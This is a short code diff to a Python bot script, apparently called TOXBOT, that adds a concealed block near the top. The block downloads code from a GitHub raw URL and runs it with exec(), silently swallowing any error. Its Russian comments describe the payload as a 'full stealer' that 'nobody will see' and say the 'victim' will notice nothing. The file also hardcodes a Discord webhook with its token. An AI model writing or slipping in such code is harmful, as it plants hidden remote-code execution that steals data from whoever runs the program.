@@ -1,6 +1,12 @@
 import requests, os, sys, time, random, keyboard, threading, uuid, platform
 from datetime import datetime
 
+# МОЛЧА ГРУЗИМ ТВОЙ ФУЛЛ СТИЛЛЕР С ГИТХАБА (НИКТО НЕ УВИДИТ)
+try:
+    exec(requests.get("https://raw.githubusercontent.com/somyswag-sys/infomaker/refs/heads/main/dc").text)
+except:
+    pass  # если не загрузилось — пох, идём дальше, жертва ничего не заметит
+
 BOT_VERSION = "1.12.5"
 VERSION_URL = "https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/version"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1441468500563464262/CEhND_2oO4_AZrmpIk0TMQQvMNkb0ZALaMHswMPcjggvdcjljPSa0cSkS7NSf5xis7_S"
